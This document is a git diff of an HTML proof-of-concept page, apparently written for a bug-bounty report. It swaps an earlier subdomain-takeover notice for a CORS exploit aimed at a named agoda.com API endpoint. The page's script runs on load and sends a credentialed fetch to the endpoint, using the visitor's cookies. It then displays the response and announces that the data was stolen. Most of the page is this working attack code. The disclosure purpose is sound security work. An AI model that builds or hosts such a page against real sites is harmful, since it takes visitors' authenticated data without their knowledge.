@@ -1,9 +1,99 @@
 <!DOCTYPE html>
-<html>
-<head><title>PoC for HackerOne</title></head>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>PoC: Agoda CORS Vulnerability</title>
+    <style>
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            background-color: #f0f2f5; 
+            color: #1c1e21; 
+            padding: 40px; 
+            text-align: center; 
+        }
+        .box { 
+            background: white; 
+            border-radius: 8px; 
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1); 
+            padding: 20px; 
+            max-width: 700px; 
+            margin: auto; 
+            border-top: 5px solid #ff4757; 
+        }
+        h2 { color: #ff4757; }
+        pre { 
+            background: #2f3542; 
+            color: #ffffff; 
+            padding: 15px; 
+            border-radius: 5px; 
+            text-align: left; 
+            overflow-x: auto; 
+            font-size: 13px; 
+            max-height: 400px;
+            overflow-y: auto;
+        }
+        .status { 
+            font-weight: bold; 
+            margin: 15px 0; 
+            padding: 10px; 
+            border-radius: 5px; 
+        }
+        .success { background: #e3f9e5; color: #1f8b24; }
+        .error { background: #ffe3e3; color: #bf2121; }
+        .info { background: #e3f2fd; color: #1565c0; }
+    </style>
+</head>
 <body>
-    <h1>Subdomain Takeover Verified</h1>
-    <p>This is a proof of concept for <b>WisdomTree</b> subdomain takeover.</p>
-    <p>Created by: stelemane</p>
+
+<div class="box">
+    <h2>Exploit Proof-of-Concept</h2>
+    <p>Target: <code>www.agoda.com/api/cronos/layout/notification/get</code></p>
+    <p>Source Origin: <code>https://stelemane.github.io</code></p>
+    
+    <div id="status" class="status info">[*] Initializing Request...</div>
+    <pre id="output">Waiting for data...</pre>
+</div>
+
+<script>
+    window.onload = function() {
+        const statusDiv = document.getElementById('status');
+        const outputDiv = document.getElementById('output');
+        
+        const target = "https://www.agoda.com/api/cronos/layout/notification/get";
+
+        statusDiv.innerText = "[*] Sending request with Credentials...";
+
+        fetch(target, {
+            method: "GET",
+            mode: "cors",
+            credentials: "include"
+        })
+        .then(response => {
+            if (response.ok) {
+                statusDiv.innerText = "[+] SUCCESS: Data Extracted Successfully!";
+                statusDiv.className = "status success";
+                return response.json();
+            } else {
+                statusDiv.innerText = "[-] FAILED: Server returned status " + response.status;
+                statusDiv.className = "status error";
+                return response.text();
+            }
+        })
+        .then(data => {
+            outputDiv.innerText = typeof data === 'object' ? JSON.stringify(data, null, 2) : data;
+            
+            if (typeof data === 'object' && data.success !== false) {
+                alert("Vulnerability Confirmed!\nData stolen from agoda.com");
+            }
+        })
+        .catch(err => {
+            statusDiv.innerText = "[-] ERROR: CORS Policy blocked the access.";
+            statusDiv.className = "status error";
+            outputDiv.innerText = err.toString() + "\n\nNote: This means the server did not reflect the Origin: https://stelemane.github.io";
+            console.error(err);
+        });
+    };
+</script>
+
 </body>
 </html>
